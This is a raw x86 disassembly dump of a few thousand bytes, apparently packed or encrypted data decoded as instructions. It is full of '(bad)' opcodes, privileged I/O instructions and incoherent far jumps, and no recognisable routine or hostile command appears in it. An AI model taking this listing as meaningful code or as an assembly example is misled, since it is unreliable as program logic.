  41fe90:	(bad)  
  41fe92:	inc    esi
  41fe93:	shl    BYTE PTR [esi],0x85
  41fe96:	pop    esi
  41fe97:	sbb    bl,0x64
  41fe9a:	outs   dx,DWORD PTR ds:[esi]
  41fe9b:	or     al,0x51
  41fe9d:	mov    dl,0x21
  41fe9f:	mov    edi,0x706d3128
  41fea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fea5:	dec    edi
  41fea6:	lods   eax,DWORD PTR ds:[esi]
  41fea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fea8:	mov    edi,0x88445b08
  41fead:	add    al,0xee
  41feaf:	cmp    dl,BYTE PTR [ebp-0x5615bf49]
  41feb5:	sbb    bl,al
  41feb7:	mov    ds:0x481e49a8,al
  41febc:	sahf   
  41febd:	cs pop edi
  41febf:	(bad)  
  41fec0:	sahf   
  41fec1:	das    
  41fec2:	and    DWORD PTR [eax+0x497dcc69],0x8c7ac83b
  41fecc:	rcr    BYTE PTR [ebx+ecx*2+0x9],0xa7
  41fed1:	nop
  41fed2:	sbb    edi,esi
  41fed4:	ins    DWORD PTR es:[edi],dx
  41fed5:	ja     0x41ff1d
  41fed7:	stos   DWORD PTR es:[edi],eax
  41fed8:	sub    eax,0xd94d98a0
  41fedd:	cli    
  41fede:	xchg   ecx,eax
  41fedf:	mov    ds,edi
  41fee1:	cmp    al,0xbc
  41fee3:	mov    ebp,0x8ebc9e8c
  41fee8:	outs   dx,BYTE PTR ds:[esi]
  41fee9:	push   eax
  41feea:	or     al,0xda
  41feec:	ins    DWORD PTR es:[edi],dx
  41feed:	cmp    al,0xf0
  41feef:	es loop 0x41ff56
  41fef2:	fdiv   DWORD PTR [esi]
  41fef4:	test   eax,0x1eb97217
  41fef9:	push   eax
  41fefa:	js     0x41ff3d
  41fefc:	in     eax,0xc1
  41fefe:	mov    ebp,0xb3ebe928
  41ff03:	add    esi,DWORD PTR [esi]
  41ff05:	rcl    BYTE PTR [edx],cl
  41ff07:	and    DWORD PTR [ecx+0x4822ad5c],esp
  41ff0d:	mov    eax,0x263ef434
  41ff12:	mov    ebp,0x1314680c
  41ff17:	mov    ah,0xe5
  41ff19:	inc    edx
  41ff1a:	mov    esp,0x182d25e
  41ff1f:	mov    al,ds:0x7e74aad9
  41ff24:	push   esi
  41ff25:	jns    0x41ff15
  41ff27:	mov    cl,bl
  41ff29:	inc    eax
  41ff2a:	and    edi,eax
  41ff2c:	pop    esi
  41ff2d:	ror    eax,0x99
  41ff30:	fwait
  41ff31:	push   esp
  41ff32:	(bad)  
  41ff33:	int    0x5a
  41ff35:	add    eax,0xabc00b1b
  41ff3a:	or     al,0x66
  41ff3c:	jmp    0xb888c2ca
  41ff41:	push   ebx
  41ff42:	ja     0x41ff06
  41ff44:	mov    eax,0x8e1efa09
  41ff49:	pop    edi
  41ff4a:	hlt    
  41ff4b:	mov    edi,0xb13c5948
  41ff50:	sbb    al,0x9
  41ff52:	sub    BYTE PTR [edx-0x32],ch
  41ff55:	in     al,0xbf
  41ff57:	jnp    0x41ff66
  41ff59:	out    0xa2,al
  41ff5b:	add    DWORD PTR [edi+0x23354e3c],esp
  41ff61:	xor    dl,ch
  41ff63:	jnp    0x41ff7b
  41ff65:	repz es jl 0x41ffb5
  41ff69:	outs   dx,BYTE PTR ds:[esi]
  41ff6a:	repz inc ecx
  41ff6c:	and    esp,DWORD PTR [ecx+0x48b29a8d]
  41ff72:	fwait
  41ff73:	mov    ebx,0x8c0c2bd9
  41ff78:	jmp    0x6b42:0xd78c7dff
  41ff7f:	test   BYTE PTR [ebx+0x78],al
  41ff82:	pushf  
  41ff83:	sub    bh,BYTE PTR [eax]
  41ff85:	xchg   esp,eax
  41ff86:	js     0x41ff08
  41ff88:	pop    esi
  41ff89:	call   0x1380:0x82a8756a
  41ff90:	mov    esp,DWORD PTR [esi-0x3]
  41ff93:	adc    BYTE PTR [esp+edi*8],al
  41ff96:	jmp    0x41ffad
  41ff98:	loopne 0x41ffb5
  41ff9a:	es sub eax,0x9b534735
  41ffa0:	gs in  eax,0xe6
  41ffa3:	in     eax,dx
  41ffa4:	inc    esp
  41ffa5:	adc    ah,BYTE PTR [eax]
  41ffa7:	stc    
  41ffa8:	loop   0x41ff4e
  41ffaa:	mov    WORD PTR [bp+si-0x5c],fs
  41ffae:	add    esi,ebp
  41ffb0:	push   0x371d492e
  41ffb5:	je     0x41ffd2
  41ffb7:	into   
  41ffb8:	js     0x420039
  41ffba:	inc    ecx
  41ffbb:	cmp    cl,BYTE PTR [ecx+edx*1+0x3e]
  41ffbf:	add    edi,edi
  41ffc1:	enter  0xf188,0xed
  41ffc5:	call   FWORD PTR [esi-0xb0268]
  41ffcb:	in     al,dx
  41ffcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffcd:	les    ebp,FWORD PTR [eax]
  41ffcf:	out    dx,al
  41ffd0:	mov    ds:0x7a36be3f,eax
  41ffd5:	aad    0xd7
  41ffd7:	xlat   BYTE PTR ds:[ebx]
  41ffd8:	sbb    BYTE PTR [ecx+0x5f6eeb48],bl
  41ffde:	pusha  
  41ffdf:	pop    ds
  41ffe0:	aad    0xf1
  41ffe2:	cmp    BYTE PTR [ebp+0x5b],bl
  41ffe5:	inc    edx
  41ffe6:	inc    esi
  41ffe7:	retf   
  41ffe8:	jns    0x41ffa2
  41ffea:	test   al,0xc2
  41ffec:	js     0x41ffa9
  41ffee:	and    BYTE PTR [ecx+0x79],0x2
  41fff2:	xchg   edi,eax
  41fff3:	xor    esp,ebp
  41fff5:	les    ebx,FWORD PTR [esi+eiz*8-0x60]
  41fff9:	les    eax,FWORD PTR [ebp+0x34]
  41fffc:	arpl   bx,di
  41fffe:	push   ebx
  41ffff:	jb     0x420014
  420001:	dec    esp
  420002:	rol    DWORD PTR [eax],cl
  420004:	inc    eax
  420005:	loope  0x41ffef
  420007:	inc    edi
  420008:	cmp    eax,ebx
  42000a:	xchg   DWORD PTR [esi-0x2c],edx
  42000d:	faddp  st(3),st
  42000f:	lods   al,BYTE PTR ds:[esi]
  420010:	mov    dl,0x69
  420012:	ds pushf 
  420014:	imul   esp,DWORD PTR [edx+ecx*1-0x5a60985],0x4556d499
  42001f:	je     0x42009b
  420021:	rcl    DWORD PTR [ecx],cl
  420023:	lock push cs
  420025:	mov    ecx,0xba3f3f87
  42002a:	dec    edi
  42002b:	adc    eax,esi
  42002d:	shl    DWORD PTR [edi-0x61],1
  420030:	imul   ecx,DWORD PTR [eax],0xffffffca
  420033:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420034:	and    DWORD PTR [ecx],eax
  420036:	loop   0x420065
  420038:	sub    bh,ah
  42003a:	(bad)  
  42003c:	mov    eax,0xfec2b57f
  420041:	sub    edi,0xffffffcd
  420044:	cmp    al,0xff
  420046:	cwde   
  420047:	test   eax,0x4ca479b8
  42004c:	in     eax,0xf6
  42004e:	sub    ah,BYTE PTR [edi+0x4a]
  420051:	jnp    0x420084
  420053:	popa   
  420054:	popa   
  420055:	or     BYTE PTR [edx+eax*8+0x2be4419c],ah
  42005c:	pop    esi
  42005d:	or     BYTE PTR [ebx],ch
  42005f:	sub    al,0xb2
  420061:	jl     0x420032
  420063:	cdq    
  420064:	xor    al,0xe9
  420066:	push   edi
  420067:	fnsave [eax-0x37323c62]
  42006d:	adc    al,0xb7
  42006f:	clc    
  420070:	leave  
  420071:	jae    0x42004d
  420073:	lds    eax,FWORD PTR [ebp+0x28780c46]
  420079:	mov    edx,0x94140ed6
  42007e:	push   edx
  42007f:	and    DWORD PTR [edx+0x1b],ebx
  420082:	adc    ah,BYTE PTR [ebx]
  420084:	mov    esp,0xf65390da
  420089:	xor    ah,0x20
  42008c:	inc    esi
  42008d:	xor    eax,0x6ce212f
  420092:	jo     0x420095
  420094:	(bad)  [ebp-0x7d5d36e7]
  42009a:	int3   
  42009b:	test   BYTE PTR [edx-0x6],dh
  42009e:	adc    al,0xb5
  4200a0:	jg     0x4200e2
  4200a2:	push   ebx
  4200a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200a4:	retf   
  4200a5:	and    BYTE PTR [ecx+0x7df942ef],ch
  4200ab:	adc    cl,BYTE PTR [ecx]
  4200ad:	addr16 push edi
  4200af:	pop    ebx
  4200b0:	retf   0x3547
  4200b3:	shl    DWORD PTR [edi+0x26],1
  4200b6:	pop    es
  4200b7:	js     0x4200ff
  4200b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200ba:	dec    edi
  4200bb:	out    dx,eax
  4200bc:	sbb    BYTE PTR [eax-0x4c],ch
  4200bf:	sbb    edi,ebx
  4200c1:	add    esi,DWORD PTR [esi]
  4200c3:	mov    esp,gs
  4200c5:	hlt    
  4200c6:	xor    ebx,DWORD PTR [edi+esi*1+0x15]
  4200ca:	jecxz  0x42013a
  4200cc:	fcmove st,st(2)
  4200ce:	out    dx,al
  4200cf:	pop    eax
  4200d0:	and    DWORD PTR [ebp+0x5efa0a0a],ecx
  4200d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200d7:	lods   eax,DWORD PTR ds:[esi]
  4200d8:	add    ecx,DWORD PTR [eax+0x320eaa30]
  4200de:	add    al,0x46
  4200e0:	retf   0xb69e
  4200e3:	xchg   esp,eax
  4200e4:	and    DWORD PTR [ebx-0x73985861],ebp
  4200ea:	xchg   esi,eax
  4200eb:	fisttp WORD PTR ds:0x88bd132d
  4200f1:	repz sbb DWORD PTR [ecx-0x4f571cfa],edx
  4200f8:	pop    ss
  4200f9:	sub    bh,al
  4200fb:	xor    BYTE PTR [edi],ah
  4200fd:	std    
  4200fe:	push   0xd6e7b940
  420103:	shl    bh,0x76
  420106:	out    dx,ax
  420108:	push   esi
  420109:	gs pusha 
  42010b:	xchg   ebx,eax
  42010c:	repz inc edx
  42010e:	int3   
  42010f:	xchg   esi,eax
  420110:	sbb    al,0xdb
  420112:	jle    0x4200fe
  420114:	retf   
  420115:	mov    eax,0x18ea0b64
  42011a:	mov    al,0xd1
  42011c:	xchg   ebx,eax
  42011d:	fimul  DWORD PTR [edx-0x31]
  420120:	jmp    0x4200fe
  420122:	pop    ds
  420123:	jnp    0x42013a
  420125:	es push ebx
  420127:	jmp    0x7c7df7ce
  42012c:	dec    ecx
  42012d:	repnz inc edx
  42012f:	loopne 0x4200d8
  420131:	ror    BYTE PTR cs:[esi],1
  420134:	cmc    
  420135:	retf   0x99b4
  420138:	outs   dx,DWORD PTR ds:[esi]
  420139:	fsubr  QWORD PTR [ebx]
  42013b:	data16 mov bl,0xdb
  42013e:	xor    esp,eax
  420140:	push   ecx
  420141:	clc    
  420142:	push   edi
  420143:	jp     0x420184
  420145:	add    DWORD PTR [ebp+0x43895ad0],ebp
  42014b:	sahf   
  42014c:	add    al,0xfd
  42014e:	mov    al,0x5a
  420150:	outs   dx,BYTE PTR ds:[esi]
  420151:	xchg   ebp,eax
  420152:	xor    dh,cl
  420154:	or     DWORD PTR [ecx+0x643d053],0xc446399f
  42015e:	sub    eax,DWORD PTR [edi-0x53]
  420161:	or     dh,ah
  420163:	add    bl,BYTE PTR [eax+0x4e]
  420166:	scas   al,BYTE PTR es:[edi]
  420167:	lods   al,BYTE PTR ds:[esi]
  420168:	pop    edi
  420169:	fcomp  DWORD PTR [eax]
  42016b:	lods   eax,DWORD PTR ds:[esi]
  42016c:	fmul   st,st(1)
  42016e:	imul   ecx,DWORD PTR [edx],0xcd0a11ad
  420174:	les    ecx,FWORD PTR [ebx]
  420176:	or     al,0x77
  420178:	jnp    0x4201a0
  42017a:	jmp    0x52d8:0xd4b0552b
  420181:	mov    ds:0x1bf03fc5,eax
  420186:	add    ebx,DWORD PTR [edi-0x13]
  420189:	adc    eax,0x3fe34603
  42018e:	es xchg edx,eax
  420190:	jno    0x42015d
  420192:	mov    dl,0x8f
  420194:	std    
  420195:	cmp    al,0x97
  420198:	loop   0x42016b
  42019a:	dec    ecx
  42019b:	inc    esp
  42019c:	sub    esp,DWORD PTR ds:0x479591a8
  4201a2:	into   
  4201a3:	sti    
  4201a4:	mov    cl,0x35
  4201a6:	jl     0x4201b9
  4201a8:	sub    BYTE PTR [ebx-0x7246403e],0x99
  4201af:	xchg   ebp,eax
  4201b0:	mov    ah,0x3
  4201b2:	loopne 0x420220
  4201b4:	les    esi,FWORD PTR [edx+eax*8-0x16ca0ef6]
  4201bb:	test   BYTE PTR [ebp-0x5a],bl
  4201be:	sbb    DWORD PTR [ecx+ebx*8-0x4cfe4fb4],ebp
  4201c5:	in     eax,0x8c
  4201c7:	test   eax,0x6015f11d
  4201cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201cd:	dec    edx
  4201ce:	frndint 
  4201d0:	push   ecx
  4201d1:	rcr    BYTE PTR [ebx],1
  4201d3:	in     al,0xe0
  4201d5:	mov    dl,BYTE PTR [esi-0x54]
  4201d8:	adc    DWORD PTR [ebx+edx*1],edi
  4201db:	push   ebx
  4201dc:	add    BYTE PTR [edi-0x62],0xd3
  4201e0:	(bad)  
  4201e1:	in     eax,0xf3
  4201e3:	push   ds
  4201e4:	xor    al,dl
  4201e6:	sub    BYTE PTR [esi],ah
  4201e8:	into   
  4201e9:	lods   al,BYTE PTR ds:[esi]
  4201ea:	loope  0x420211
  4201ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201ed:	xor    eax,0x59600b53
  4201f2:	fxch   st(3)
  4201f4:	lods   al,BYTE PTR ds:[esi]
  4201f5:	pop    es
  4201f6:	cwde   
  4201f7:	dec    ebp
  4201f8:	mov    ecx,0x719c33f3
  4201fd:	(bad)  
  4201fe:	pop    ebp
  4201ff:	test   BYTE PTR [edi],bl
  420201:	ins    DWORD PTR es:[edi],dx
  420202:	xchg   esi,eax
  420203:	xchg   esp,eax
  420204:	pusha  
  420205:	imul   esp,DWORD PTR [edx+0x1b],0x10
  420209:	jns    0x42019b
  42020b:	fst    DWORD PTR [esi]
  42020d:	ss nop
  42020f:	fs mov ah,0x36
  420212:	imul   esp,DWORD PTR [edi+0x79939aef],0xffffff8b
  420219:	adc    ebp,edx
  42021b:	and    bl,BYTE PTR [ebx+0x41]
  42021e:	in     eax,0xac
  420220:	adc    al,0xfe
  420222:	repnz inc esp
  420224:	add    eax,0x4797aebb
  420229:	add    bl,dh
  42022b:	scas   eax,DWORD PTR es:[edi]
  42022c:	sbb    esp,edx
  42022e:	fcom   DWORD PTR [eax-0x32e993a7]
  420234:	ins    DWORD PTR es:[edi],dx
  420235:	retf   0xac43
  420238:	pushf  
  420239:	xchg   ebp,eax
  42023a:	popf   
  42023b:	xchg   DWORD PTR [ebp+0x7d],edx
  42023e:	fistp  QWORD PTR [ebp+0x56]
  420241:	pop    ecx
  420242:	adc    bh,0xfc
  420245:	mov    BYTE PTR [ebp+0x58],al
  420248:	sahf   
  420249:	fldcw  WORD PTR [ecx-0x45dbb31a]
  42024f:	int    0xd1
  420251:	mov    ecx,0x13b38c77
  420256:	pop    esi
  420257:	inc    edx
  420258:	mov    BYTE PTR [ecx-0x41061e96],ch
  42025e:	sbb    bl,ch
  420260:	daa    
  420261:	pop    edi
  420262:	fild   DWORD PTR [ebx-0x62fa5603]
  420268:	or     edx,DWORD PTR [edi]
  42026a:	push   edx
  42026b:	xor    al,0x6a
  42026d:	mov    edx,0xd8b7b05d
  420272:	mov    eax,ds:0xc6a78741
  420277:	stc    
  420278:	call   0xdffbf52b
  42027d:	xchg   esi,eax
  42027e:	pop    ss
  42027f:	pop    es
  420280:	mov    bh,0x1b
  420282:	fs pop esi
  420284:	jmp    0xa53cf7ee
  420289:	test   eax,0xc44d5ce2
  42028e:	cmp    ebp,DWORD PTR [ecx]
  420290:	das    
  420291:	or     eax,0x79b0cf2a
  420296:	(bad)  
  420297:	test   al,0xb1
  420299:	fidiv  WORD PTR [eax+esi*4]
  42029c:	mov    edi,0xcb76a756
  4202a1:	mov    esi,0xfe8134b2
  4202a6:	xlat   BYTE PTR ds:[ebx]
  4202a7:	push   esi
  4202a8:	in     eax,0x37
  4202aa:	jae    0x420251
  4202ac:	sbb    ecx,DWORD PTR [esi+edx*8+0x15a97566]
  4202b3:	icebp  
  4202b4:	rcr    BYTE PTR [ecx+0x106a164e],cl
  4202ba:	rcl    edi,cl
  4202bc:	retf   0xe4d0
  4202bf:	data16 test BYTE PTR [ebp-0x5f750c55],bh
  4202c6:	xchg   esp,eax
  4202c7:	mov    ah,ch
  4202c9:	sbb    al,0x35
  4202cb:	int    0x69
  4202cd:	mov    eax,0x7b1debaa
  4202d2:	jbe    0x4202fe
  4202d4:	jo     0x420336
  4202d6:	mov    ebp,0x1663bcce
  4202db:	push   cs
  4202dc:	jns    0x420321
  4202de:	adc    BYTE PTR [esi-0x62],al
  4202e1:	sub    al,0x29
  4202e3:	cwde   
  4202e4:	std    
  4202e5:	sub    al,BYTE PTR [edi]
  4202e7:	mov    edi,0x6862fa0a
  4202ec:	pop    esi
  4202ed:	xor    dh,cl
  4202ef:	pop    eax
  4202f0:	aad    0x8f
  4202f2:	in     al,dx
  4202f3:	xchg   edi,eax
  4202f4:	xor    al,0x3d
  4202f6:	jecxz  0x420301
  4202f8:	xchg   esp,eax
  4202f9:	cwde   
  4202fa:	sbb    DWORD PTR [bp+si],esp
  4202fd:	push   0x37
  4202ff:	ja     0x420358
  420301:	push   0xb36e3b59
  420306:	inc    DWORD PTR [esi-0x29663338]
  42030c:	popf   
  42030d:	push   edi
  42030e:	jp     0x420384
  420310:	fisubr DWORD PTR [edi]
  420312:	xchg   ebp,eax
  420313:	or     al,0x70
  420315:	cmp    ebx,eax
  420317:	jl     0x42035b
  420319:	and    BYTE PTR [edx-0x1e],dl
  42031c:	xor    DWORD PTR [edi-0x3d4fbcc8],0x6
  420323:	fwait
  420324:	or     cl,dl
  420326:	fcmovb st,st(7)
  420328:	dec    ebx
  420329:	inc    esi
  42032a:	sbb    al,0xcf
  42032c:	les    edx,FWORD PTR [edx-0x25]
  42032f:	sti    
  420330:	adc    BYTE PTR [edi],0xcf
  420333:	leave  
  420334:	cdq    
  420335:	ins    DWORD PTR es:[edi],dx
  420336:	add    eax,0x9644702c
  42033b:	jo     0x4202d9
  42033d:	dec    DWORD PTR [ebp-0x37]
  420340:	xor    esi,DWORD PTR [edi+0x5f]
  420343:	imul   ecx,DWORD PTR [edi+0x62],0x9bbc41d0
  42034a:	fs (bad) 
  42034c:	adc    al,dl
  42034e:	ss inc esp
  420350:	test   dh,bh
  420352:	mov    edi,0x31307c8a
  420358:	sti    
  420359:	je     0x4203c3
  42035b:	loope  0x42035b
  42035d:	jbe    0x420308
  42035f:	shl    DWORD PTR [edx+0x5f],1
  420362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420363:	mov    bh,0xf4
  420365:	addr16 mov dl,0xc5
  420368:	jb     0x42035e
  42036a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42036b:	or     BYTE PTR [ecx],0xa7
  42036e:	imul   edi,ebp,0x39
  420371:	and    dl,BYTE PTR [ebx+0x3c]
  420374:	cmp    ch,BYTE PTR ds:0x651832c
  42037a:	cdq    
  42037b:	sar    dl,0x85
  42037e:	mov    bl,0x5c
  420380:	sbb    al,0xdc
  420382:	jp     0x420374
  420384:	dec    eax
  420385:	lods   eax,DWORD PTR ds:[esi]
  420386:	push   ss
  420387:	int3   
  420388:	jp     0x420356
  42038a:	fwait
  42038b:	jbe    0x42036d
  42038d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42038e:	jmp    0x4203bd
  420390:	in     eax,dx
  420391:	inc    edx
  420392:	add    DWORD PTR [ebx],eax
  420394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420395:	inc    ebp
  420396:	(bad)  
  420397:	or     al,0xe6
  420399:	xchg   DWORD PTR [edi-0x31],esp
  42039c:	das    
  42039d:	cld    
  42039e:	fisttp WORD PTR [esi+0x1a54bb3b]
  4203a4:	jp     0x4203c1
  4203a6:	or     eax,ecx
  4203a8:	leave  
  4203a9:	addr16 inc ecx
  4203ab:	inc    ebp
  4203ac:	sbb    dl,BYTE PTR [ebx+esi*2+0xba7feb0]
  4203b3:	test   al,ch
  4203b5:	mov    dh,0x9c
  4203b7:	sub    DWORD PTR [eax],ebp
  4203b9:	repnz push esi
  4203bb:	test   BYTE PTR [edi+ecx*8-0x63245bb9],bl
  4203c2:	pop    esp
  4203c3:	xchg   ecx,eax
  4203c4:	icebp  
  4203c5:	mov    ch,0xa8
  4203c7:	imul   edi,DWORD PTR [esi+0xa],0xd2d79021
  4203ce:	and    ecx,DWORD PTR [ebx+edx*8+0x25718b5]
  4203d5:	cwde   
  4203d6:	cmp    DWORD PTR ds:0x9beba0e4,ecx
  4203dc:	cdq    
  4203dd:	push   edx
  4203de:	lods   eax,DWORD PTR ds:[esi]
  4203e0:	cld    
  4203e1:	sbb    eax,0xfef13447
  4203e6:	cmp    DWORD PTR [esi+edx*4+0x36],0xa7ba214e
  4203ee:	mov    dh,0x11
  4203f0:	xchg   ebp,eax
  4203f1:	mov    eax,ds:0xb0f0cf62
  4203f6:	loopne 0x42038b
  4203f8:	bound  ecx,QWORD PTR [edi+ecx*8+0x4d]
  4203fc:	mov    bh,0x60
  4203fe:	adc    BYTE PTR [esp+ebp*1-0x35a07f8f],0x9b
  420406:	push   ebx
  420407:	scas   eax,DWORD PTR es:[edi]
  420408:	xor    edi,DWORD PTR [edx+ecx*1]
  42040b:	ds mov esp,0xcb5c6001
  420411:	mov    ds,WORD PTR [ecx+0x1]
  420414:	cli    
  420415:	xchg   DWORD PTR [esi+0x7cb932c6],ecx
  42041b:	je     0x420433
  42041d:	pop    ecx
  42041e:	inc    ecx
  42041f:	fcom   QWORD PTR [eax+0x25]
  420422:	sti    
  420423:	inc    edi
  420424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420425:	mov    ds:0xbf5b92d2,eax
  42042a:	sbb    BYTE PTR [esi+0x31c2761c],0xcb
  420431:	ret    0xe85
  420434:	xor    ebx,eax
  420436:	or     al,0xde
  420438:	imul   eax,DWORD PTR [edi-0x78],0x355cef83
  42043f:	xor    al,0xd
  420441:	push   edi
  420442:	sti    
  420443:	nop
  420444:	into   
  420445:	ret    0x91b3
  420448:	jbe    0x420491
  42044a:	icebp  
  42044b:	sbb    eax,0x86226030
  420450:	enter  0x22eb,0xa9
  420454:	xor    ecx,DWORD PTR [esi]
  420456:	popa   
  420457:	aad    0x6d
  420459:	loop   0x42046f
  42045b:	imul   DWORD PTR [ebx+0x78f2ed04]
  420461:	adc    al,0xe9
  420463:	add    ah,al
  420465:	ins    BYTE PTR es:[edi],dx
  420466:	retf   0x238b
  420469:	call   DWORD PTR [edi-0x1b804bef]
  42046f:	rcl    al,1
  420471:	aaa    
  420472:	dec    BYTE PTR [esi]
  420474:	lods   al,BYTE PTR ds:[esi]
  420475:	mov    ebx,0x684445ac
  42047a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42047b:	stc    
  42047c:	psubusw mm5,QWORD PTR [ebx+0x1072b2f8]
  420483:	jg     0x42045b
  420485:	nop
  420486:	pop    ebp
  420487:	dec    ebx
  420488:	sub    eax,0x16f11ee2
  42048d:	dec    ebx
  42048e:	ret    0xdc4a
  420491:	xchg   edx,eax
  420492:	iret   
  420493:	mov    al,0xae
  420495:	push   eax
  420496:	xor    DWORD PTR [eax+edi*2-0x3e],esp
  42049a:	hlt    
  42049b:	retf   0x2bfe
  42049e:	or     al,0xa8
  4204a0:	in     al,0xb1
  4204a2:	sub    eax,0x2198a982
  4204a7:	mov    ds:0x7b159e12,al
  4204ac:	stos   BYTE PTR es:[edi],al
  4204ad:	dec    edx
  4204ae:	call   0xffc6ddf1
  4204b3:	mov    bl,BYTE PTR [ebx-0x15]
  4204b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204b7:	jge    0x420448
  4204b9:	mov    ch,0x9e
  4204bb:	punpckhbw mm2,mm2
  4204be:	mov    esp,0xaab1c02a
  4204c3:	pop    edx
  4204c4:	rol    ecx,cl
  4204c6:	out    dx,al
  4204c7:	dec    edi
  4204c8:	and    DWORD PTR [ebx+0x34],ecx
  4204cb:	sub    al,0x53
  4204cd:	out    0x4f,eax
  4204cf:	jle    0x420455
  4204d1:	jne    0x420511
  4204d3:	pop    es
  4204d4:	popa   
  4204d5:	into   
  4204d6:	enter  0xde59,0xe0
  4204da:	(bad)  
  4204db:	xchg   ebp,eax
  4204dc:	daa    
  4204dd:	jge    0x420492
  4204df:	pushf  
  4204e0:	inc    esp
  4204e1:	add    DWORD PTR [eax+0x47165b40],edi
  4204e7:	inc    esp
  4204e8:	gs add al,0x2b
  4204eb:	mov    ebx,0xaba18602
  4204f0:	mov    dl,0x75
  4204f2:	fsub   QWORD PTR [edi+0x7ff778ff]
  4204f8:	aas    
  4204f9:	mov    eax,ds:0x56aa9312
  4204fe:	ds sbb eax,0x265f6ff
  420504:	or     eax,0x34dc8ee3
  420509:	sbb    edx,DWORD PTR [edx+0x6e]
  42050c:	pop    ds
  42050d:	push   cs
  42050e:	outs   dx,DWORD PTR ds:[esi]
  42050f:	adc    dl,BYTE PTR [eax+edi*2]
  420512:	xlat   BYTE PTR ds:[ebx]
  420513:	mov    al,ds:0xa0f471b0
  420518:	imul   edi,DWORD PTR [ecx+0x5367f467],0xfffffff1
  42051f:	add    ebp,DWORD PTR [ebx-0x33]
  420522:	mov    cl,dl
  420524:	jmp    0x6d005019
  420529:	out    0xa9,al
  42052b:	fsub   QWORD PTR [esi]
  42052d:	fwait
  42052e:	int3   
  42052f:	cmp    DWORD PTR [ebp+0x79e68a3d],0xb3c21ee1
  420539:	nop
  42053a:	mov    eax,eax
  42053c:	jmp    0x9e22df0f
  420541:	inc    esp
  420542:	leave  
  420543:	sub    esp,esp
  420545:	call   0x5c26:0xb574ef63
  42054c:	sbb    DWORD PTR [ecx-0x5d9011a1],ebp
  420552:	jg     0x4205b1
  420554:	sbb    DWORD PTR [ebx+edi*2],eax
  420557:	in     al,0x93
  420559:	mov    dl,0xfc
  42055b:	out    dx,eax
  42055c:	test   eax,0x3fe92956
  420561:	fadd   DWORD PTR [ebp+eax*8+0x36]
  420565:	dec    ebx
  420566:	dec    esi
  420567:	adc    al,0xa4
  420569:	mov    eax,ds:0x669a956d
  42056e:	sbb    dh,BYTE PTR [edi-0x60524899]
  420574:	shl    DWORD PTR [ecx],cl
  420576:	xchg   edi,eax
  420577:	cmp    al,0x14
  420579:	daa    
  42057a:	repnz lahf 
  42057c:	inc    edx
  42057d:	or     eax,0x2058e2aa
  420582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420583:	inc    edx
  420584:	xor    ebp,ebp
  420586:	jmp    0xb155:0xad2b360e
  42058d:	dec    edx
  42058e:	and    eax,0x9600c388
  420593:	or     BYTE PTR [eax-0x4b],bl
  420596:	test   al,0xa7
  420598:	fsubr  QWORD PTR [ebx-0x5c]
  42059b:	jmp    0x420551
  42059d:	sar    ch,cl
  42059f:	lds    ebp,FWORD PTR [ecx]
  4205a1:	pop    edx
  4205a2:	pop    ss
  4205a3:	in     eax,0x81
  4205a5:	sar    BYTE PTR [esi],cl
  4205a7:	dec    esi
  4205a8:	int    0x28
  4205aa:	retf   
  4205ab:	cmp    BYTE PTR [ebx],ch
  4205ad:	test   BYTE PTR [ebp+0x5d],ah
  4205b0:	xchg   BYTE PTR [edx],bl
  4205b2:	jnp    0x4205c2
  4205b4:	or     BYTE PTR [esi-0x6d594610],0x37
  4205bb:	pop    ecx
  4205bc:	inc    ebp
  4205bd:	out    dx,eax
  4205be:	lods   eax,DWORD PTR ds:[esi]
  4205bf:	mov    edx,0xed1a0f21
  4205c4:	fs nop
  4205c6:	dec    eax
  4205c7:	mov    eax,ds:0xa28c34bf
  4205cc:	imul   eax,DWORD PTR [eax-0x6f5d5755],0x6
  4205d3:	dec    edi
  4205d4:	and    eax,0xe4272f2d
  4205d9:	mov    ch,0x31
  4205db:	add    eax,0x5034dbbe
  4205e0:	pushf  
  4205e1:	mov    eax,ebp
  4205e3:	mov    ds:0xcfd50166,al
  4205e8:	pop    esi
  4205e9:	nop
  4205ea:	fnstcw WORD PTR [esi-0x13]
  4205ed:	aam    0x9c
  4205ef:	retf   0xae45
  4205f2:	jmp    0x4a02:0x3abe99c1
  4205f9:	mov    al,cl
  4205fb:	push   es
  4205fc:	push   esi
  4205fd:	ins    BYTE PTR es:[edi],dx
  4205fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205ff:	pop    ebp
  420600:	add    ch,BYTE PTR [esi]
  420602:	dec    esp
  420603:	ficomp WORD PTR [ecx]
  420605:	jg     0x420640
  420607:	inc    ecx
  420608:	and    eax,0xeefa9ae
  42060d:	and    DWORD PTR [ecx],edi
  42060f:	push   ebx
  420610:	adc    edi,DWORD PTR [esi-0x51]
  420613:	mov    eax,ecx
  420615:	clc    
  420616:	mov    ebp,0xec724953
  42061b:	pop    eax
  42061c:	and    al,0x1a
  42061e:	push   esp
  42061f:	(bad)  
  420620:	mov    esi,DWORD PTR [edx+ecx*2+0x4b]
  420624:	jg     0x420618
  420626:	xchg   edi,eax
  420627:	repnz xor bl,dl
  42062a:	or     BYTE PTR [eax-0x20],bl
  42062d:	sbb    DWORD PTR [eax+0x3b8341d9],eax
  420633:	fisttp DWORD PTR [ebx]
  420635:	pop    es
  420636:	pop    ebp
  420637:	and    eax,0x3481df0b
  42063c:	mov    bh,0x46
  42063e:	or     BYTE PTR [eax],cl
  420640:	and    BYTE PTR [edx+0x77],cl
  420643:	call   0xee0c:0x166084e
